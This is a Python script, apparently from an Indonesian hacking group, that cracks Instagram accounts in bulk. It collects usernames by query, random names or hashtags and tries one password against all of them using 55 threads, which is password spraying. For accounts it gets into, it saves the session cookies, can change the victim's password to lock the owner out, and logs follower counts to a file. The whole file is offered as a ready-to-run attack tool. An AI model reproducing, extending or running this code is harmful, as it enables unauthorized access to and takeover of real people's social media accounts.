#Xractz - IndoSec
#NOT FOR SALE!
#If you want to recode please provide the origin or tools owner!

import requests, random, pickle, json, time, sys, os, re
from concurrent.futures import ThreadPoolExecutor


C = "\033[39;0m"
B = "\033[1m"
D = "\033[2m"
W = "\033[37m"
R = "\033[31m"
Y = "\033[33m"
G = "\033[32m"


def saveCookie(usr, rc):
        f = open(f"tmp/{usr}.tmp", "wb")
        pickle.dump(rc, f)


def loadCookie(usr):
        f = open(f"tmp/{usr}.tmp", "rb")
        cookie = pickle.load(f)
        return cookie


def menu():
        print(f"\n[{Y + B}99{C}]Back to menu!\n[{Y + B}00{C}]EXIT!")

        cmd = input("\n>>> ")
        key = ["99","00"]
        while cmd not in key:
                cmd = input(">>> ")

        if cmd == "99":
                os.system("python3 mbi.py")
        elif cmd == "00":
                print()
                t = 3
                while t:
                        print(f"Exiting from {t}s", end="\r")
                        time.sleep(1)
                        t -= 1
                os.system('rm -rf tmp')
                os.system("clear")
                sys.exit()


def Bypass():
        ua_list = open("ua.txt", "r").readlines()
        ua = []
        for x in ua_list:
                ua.append(x)
        ua = random.choice(ua)
        ua = ua.replace("\n", "")

        # proxy = requests.get("https://free-proxy-list.net/").text
        # proxy = re.findall(r"<tr><td>(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})</td><td>(\d+?)</td>", proxy)

        # proxies = []
        # for x in proxy:
        #       proxies.append(":".join(x))
        # proxy = random.choice(proxies)
        # proxies = {'http':f"{proxy}",'https':proxy}

        return ua


def searchQuery(username):
        ua = Bypass()
        headers = {"User-Agent":ua}
        data = requests.get(f"https://www.instagram.com/web/search/topsearch/?context=blended&query={username}", headers=headers).text
        data = json.loads(data)
        usr = []
        jml = 0

        for data in data['users']:
                jml += 1
                username = data['user']['username']
                usr.append(username)

        return usr, jml


def randomSearch(count):
        ua = Bypass()
        headers = {"User-Agent":ua}
        users = {}
        jumlah = 0
        for x in range(count):
                username = requests.get('https://fakenamecreator.com/?gender=random&locale=id_ID', headers=headers).text
                username = re.findall(r"<b itemprop=\"name\">(.*?) </b></h3>", username)[0]
                username = username.split()
                username = random.choice(username)
                usr, jml = searchQuery(username)
                users[username] = usr
                jumlah += jml

        return users, jumlah


def getUserPost(id):
        for id in id:
                usr = requests.get(f"https://www.instagram.com/p/{id}/").text
                usr = re.findall(r"\"username\"\:\"(.*?)\"", usr)

        return usr

def searchTags(tags):
        ua = Bypass()
        headers = {"User-Agent":ua}
        url = f"https://www.instagram.com/explore/tags/{tags}/?_a=1"
        ids = requests.get(url, headers=headers).text
        ids = re.findall(r"\"shortcode\"\:\"(.*?)\"", ids)
        jml = 0

        with ThreadPoolExecutor(max_workers=55) as e:
                futures = []
                for id in ids:
                        futures.append(e.submit(getUserPost, id))
                for i, future in enumerate(futures):
                        usr = future.result()
                        jml += 1


        return usr, jml


def changePassword(username, password, np):
        ua = Bypass()

        url = "https://www.instagram.com/"
        cookie = loadCookie(username)

        token = requests.get(url, cookies=cookie).text
        token = re.findall(r"\"csrf_token\"\:\"(.*?)\"", token)[0]

        nps = {
        "old_password":password,
        "new_password1":np,
        "new_password2":np
        }

        headers = {
        "User-Agent":ua,
        "x-csrftoken":token
        }

        npass = requests.post("https://www.instagram.com/accounts/password/change/", headers=headers, data=nps, cookies=cookie).text
        response = re.findall(r"\"status\"\: \"(.*?)\"", npass)[0]

        if "ok" in response.lower():
                result = np
        elif "fail" in response.lower():
                result = "error"

        return result


def checkFoll(username):
        ua = Bypass()
        headers = {"User-Agent":ua}
        url = f"https://www.instagram.com/{username}/"
        foll = requests.get(url).text
        foll = re.findall(r"\"edge_followed_by\"\:\{\"count\"\:(\d+)\}", foll)[0]

        return foll


def loginInstagram(username, password):
        ua = Bypass()
        s = requests.Session()
        url = "https://www.instagram.com/accounts/login/"
        url_log = url + "ajax/"

        token = s.get(url)
        headers = {"User-Agent":ua}
        headers["x-csrftoken"] = token.cookies["csrftoken"]

        data = {
        "username":username,
        "password":password,
        }

        login = s.post(url_log, headers=headers, data=data)
        cookie = login.cookies
        result = login.text

        return result, username, password, cookie


def bfInstagram(users, password, command, newpassword):
        die = 0;live = 0;cp = 0
        with ThreadPoolExecutor(max_workers=55) as e:
                futures = []
                for user in users:
                        futures.append(e.submit(loginInstagram, user, password))

                for i, future in enumerate(futures):
                        result, username, password, cookie = future.result()
                        try:
                                login = re.findall(r"\"authenticated\"\: (.*?)\,", result)[0]
                        except IndexError:
                                print(f"[{R + B}!{C}]Please wait a few minutes before you try again.")
                                t = 600
                                while t:
                                        minu, sec = divmod(t, 60)
                                        print(f"[{R + B}!{C}]Restarting from {minu}:{sec}", end="\r")
                                        time.sleep(1)
                                        t -= 1
                                continue

                        if login == 'false':
                                print(f"[{R + B}!{C}]{username}|{password}")
                                die += 1

                        elif login == 'true':
                                saveCookie(username, cookie)

                                if command.lower() == "y":
                                        foll = checkFoll(username)
                                        result = changePassword(username, password, newpassword)
                                        print(f"[{G + B}+{C}{username}|{result}| Followers : {foll}")

                                        get = open("live.txt", "a")
                                        get.write(f"\n{username}|{result}|Followers : {foll}")
                                        get.close()
                                        live +=1

                                elif command.lower() == "n":
                                        foll = checkFoll(username)
                                        print(f"[{G + B}+{C}{username}|{password}|Followers : {foll}")
                                        get = open("live.txt", "a")
                                        get.write(f"\n{username}|{password}|Followers : {foll}")
                                        get.close()
                                        live +=1

                        elif login == 'checkpoint_required':
                                print(f"[{R + B}!{C}]{username}|{password}")
                                cp += 1

                        else:
                                print(f"[{R + B}!{C}]{username}|{password}")
                                die += 1

        result = f"\n[{G + B}+{C}]Live : {live} | Die : {die} | Checkpoint : {cp}"
        return result


if __name__ == "__main__":
        try:
                os.system('clear')

                if os.path.isdir("tmp") == True:
                        os.system('rm -rf tmp')
                else:
                        os.mkdir("tmp")

                CLR = ["\033[31;1m", "\033[32;1m", "\033[33;1m", "\033[34;1m", "\033[35;1m", "\033[36;1m"]
                rdm = random.choice(CLR)

                banner = f'''
{rdm} __  __ ___ ___
{rdm}|  \/  | _ )_ _| {W + B}| Author  : Bayu Nugraha
{rdm}| |\/| | _ \| |  {W + B}| Contact : 089679647562
{rdm}|_|  |_|___/___| {W + B}| Bismilah dulu Goblok - {R + D}Mas{W + B}Bay{C}
                '''
                print(banner)
                print("1. Search username by query")
                print("2. Search username by multipel query")
                print("3. Search username by random name")
                print("4. Search username by #hastag")
                print("5. Search username by multipel #hastag")
                print("6. Contact Owner")
                print("0. EXIT")

                cmd = input("\n>>> ")
                key = ["0","1","2","3","4","5","6"]
                while cmd not in key:
                        cmd = input(">>> ")

                if cmd == "0":
                        print()
                        t = 3
                        while t:
                                print(f"Exiting from {t}s", end="\r")
                                time.sleep(2)
                                t -= 1
                        os.system('rm -rf tmp')
                        os.system("clear")
                        sys.exit()

                if cmd == "1":
                        os.system('clear')
                        print(banner)
                        username = input(f"[{Y + B}?{C}]Query    : ")

                        while username == "":
                                print(f"[{R + B}!{C}]Status   : Please don't be empty")
                                time.sleep(2)
                                os.system('clear')
                                print(banner)
                                username = input(f"[{Y + B}?{C}]Query    : ")
                        print(f"[{G + B}+{C}]Status   : Grabbing please wait")

                        usr, jml = searchQuery(username)
                        print(f"[{G + B}+{C}]Geted    : {G + B}{jml}{C} username")
                        passwd = input(f"[{Y + B}?{C}]Password : ")

                        while passwd == "" or len(passwd) < 8:
                                passwd = input(f"[{Y + B}?{C}]Password : ")

                        cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
                        while cmd == "":
                                cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")

                        if cmd.lower() == "y":
                                cpw = input(f"[{Y + B}?{C}]New Password : ")
                                while cpw == "" or len(cpw) < 8:
                                        cpw = input(f"[{Y + B}?{C}]New Password : ")

                                print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")

                                result = bfInstagram(usr, passwd, cmd, cpw)
                                print(result)
                                print(f"[{G + B}+{C}]Saved on live.txt")
                                menu()


                        elif cmd.lower() == "n":
                                print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
                                result = bfInstagram(usr, passwd, cmd, "")
                                print(result)
                                print(f"[{G + B}+{C}]Saved on live.txt")
                                menu()


                elif cmd == "2":
                        os.system('clear')
                        print(banner)
                        print(f"[{R + B}!{C}]Use comma to multipel query (ex: name,name2)")
                        username = input(f"[{Y + B}?{C}]Query    : ")

                        while username == "":
                                print(f"[{R + B}!{C}]Status   : Please don't be empty")
                                time.sleep(2)
                                os.system('clear')
                                print(banner)
                                username = input(f"[{Y + B}?{C}]Query    : ")
                        print(f"[{G + B}+{C}]Status   : Grabbing please wait")

                        usr = username.split(",")
                        final = []
                        jumlah = 0

                        with ThreadPoolExecutor(max_workers=2) as e:
                                futures = []
                                for username in usr:
                                        futures.append(e.submit(searchQuery, username))
                                for i, future in enumerate(futures):
                                        usr, jml = future.result()
                                        final += usr
                                        jumlah += jml

                        print(f"[{R + B}!{C}]Geted    : {jumlah} username")

                        passwd = input(f"[{Y + B}?{C}]Password : ")
                        while passwd == "" or len(passwd) < 8:
                                passwd = input(f"[{Y + B}?{C}]Password : ")

                        cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
                        while cmd == "":
                                cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")

                        if cmd.lower() == "y":
                                cpw = input(f"[{Y + B}?{C}]New Password : ")
                                while cpw == "" or len(cpw) < 8:
                                        cpw = input(f"[{Y + B}?{C}]New Password : ")

                                print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")

                                result = bfInstagram(final, passwd, cmd, cpw)
                                print(result)
                                print(f"[{G + B}+{C}]Saved on live.txt")
                                menu()

                        elif cmd.lower() == "n":
                                print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
                                result = bfInstagram(final, passwd, cmd, "")
                                print(result)
                                print(f"[{G + B}+{C}]Saved on live.txt")
                                menu()


                elif cmd == "3":
                        os.system('clear')
                        print(banner)
                        count = input(f"[{Y + B}?{C}]Count    : ")

                        while count.isdigit() == False:
                                print(f"[{R + B}!{C}]Status   : Please enter a valid number")
                                time.sleep(2)
                                os.system('clear')
                                print(banner)
                                count = input(f"[{Y + B}?{C}]Count    : ")
                        print(f"[{G + B}+{C}]Status   : Grabbing please wait")

                        final = []
                        users, jumlah = randomSearch(int(count))
                        for username, user in users.items():
                                for usr in user:
                                        final.append(usr)
                        print(f"[{R + B}!{C}]Geted    : {jumlah} username")
                        passwd = input(f"[{Y + B}?{C}]Password : ")

                        while passwd == "" or len(passwd) < 8:
                                passwd = input(f"[{Y + B}?{C}]Password : ")

                        cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
                        while cmd == "":
                                cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")

                        if cmd.lower() == "y":
                                cpw = input(f"[{Y + B}?{C}]New Password : ")
                                while cpw == "" or len(cpw) < 8:
                                        cpw = input(f"[{Y + B}?{C}]New Password : ")

                                print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")

                                result = bfInstagram(final, passwd, cmd, cpw)
                                print(result)
                                print(f"[{G + B}+{C}]Saved on live.txt")
                                menu()

                        elif cmd.lower() == "n":
                                print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
                                result = bfInstagram(final, passwd, cmd, "")
                                print(result)
                                print(f"[{G + B}+{C}]Saved on live.txt")
                                menu()


                elif cmd == "4":
                        os.system('clear')
                        print(banner)
                        tags = input(f"[{Y + B}?{C}]Tags     : ")
                        tags = tags.replace("#", "")

                        while " " in tags:
                                print(f"[{R + B}!{C}]Status   : Please don't use space")
                                time.sleep(2)
                                os.system('clear')
                                print(banner)
                                tags = input(f"[{Y + B}?{C}]Tags     : ")

                        while tags == "":
                                print(f"[{R + B}!{C}]Status   : Please don't be empty")
                                time.sleep(2)
                                os.system('clear')
                                print(banner)
                                tags = input(f"[{Y + B}?{C}]Tags     : ")
                        print(f"[{G + B}+{C}]Status   : Grabbing please wait")

                        usr, jml = searchTags(tags)
                        print(f"[{R + B}!{C}]Geted    : {jml} username")
                        passwd = input(f"[{Y + B}?{C}]Password : ")

                        while passwd == "" or len(passwd) < 8:
                                passwd = input(f"[{Y + B}?{C}]Password : ")

                        cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
                        while cmd == "":
                                cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")

                        if cmd.lower() == "y":
                                cpw = input(f"[{Y + B}?{C}]New Password : ")
                                while cpw == "" or len(cpw) < 8:
                                        cpw = input(f"[{Y + B}?{C}]New Password : ")

                                print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")

                                result = bfInstagram(usr, passwd, cmd, cpw)
                                print(result)
                                print(f"[{G + B}+{C}]Saved on live.txt")
                                menu()

                        elif cmd.lower() == "n":
                                print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
                                result = bfInstagram(final, passwd, cmd, "")
                                print(result)
                                print(f"[{G + B}+{C}]Saved on live.txt")
                                menu()


                elif cmd == "5":
                        os.system('clear')
                        print(banner)
                        print(f"[{R + B}!{C}]Use comma to multipel query (ex: #tags,#tags2)")
                        tags = input(f"[{Y + B}?{C}]Tags     : ")
                        tags = tags.replace("#", "")

                        while " " in tags:
                                print(f"[{R + B}!{C}]Status   : Please don't use space")
                                time.sleep(2)
                                os.system('clear')
                                print(banner)
                                tags = input(f"[{Y + B}?{C}]Tags     : ")

                        while tags == "":
                                print(f"[{R + B}!{C}]Status   : Please don't be empty")
                                time.sleep(2)
                                os.system('clear')
                                print(banner)
                                tags = input(f"[{Y + B}?{C}]Tags     : ")
                        print(f"[{G + B}+{C}]Status   : Grabbing please wait")

                        tags = tags.split(",")
                        final = []
                        jumlah = 0
                        for tag in tags:
                                usr, jml = searchTags(tag)
                                final += usr
                                jumlah += jml
                        print(f"[{R + B}!{C}]Geted    : {jumlah} username")

                        passwd = input(f"[{Y + B}?{C}]Password : ")
                        while passwd == "" or len(passwd) < 8:
                                passwd = input(f"[{Y + B}?{C}]Password : ")

                        cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")
                        while cmd == "":
                                cmd = input(f"[{Y + B}?{C}]Auto change password?(y/n) ")

                        if cmd.lower() == "y":
                                cpw = input(f"[{Y + B}?{C}]New Password : ")
                                while cpw == "" or len(cpw) < 8:
                                        cpw = input(f"[{Y + B}?{C}]New Password : ")

                                print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")

                                result = bfInstagram(final, passwd, cmd, cpw)
                                print(result)
                                print(f"[{G + B}+{C}]Saved on live.txt")
                                menu()

                        elif cmd.lower() == "n":
                                print(f"\n[{R + B}!{C}]Status   : Cracking please wait!")
                                result = bfInstagram(final, passwd, cmd, "")
                                print(f"[{G + B}+{C}]Saved on live.txt")
                                menu()


                elif cmd == "6":
                        os.system("xdg-open https://t.me/Xractz")
                        os.system("clear")
                        sys.exit()


        except(EOFError, KeyboardInterrupt):
                print()
                t = 3
                while t:
                        print(f"Exiting from {t}s", end="\r")
                        time.sleep(1)
                        t -= 1
                os.system('rm -rf tmp')
                os.system("clear")
                sys.exit()
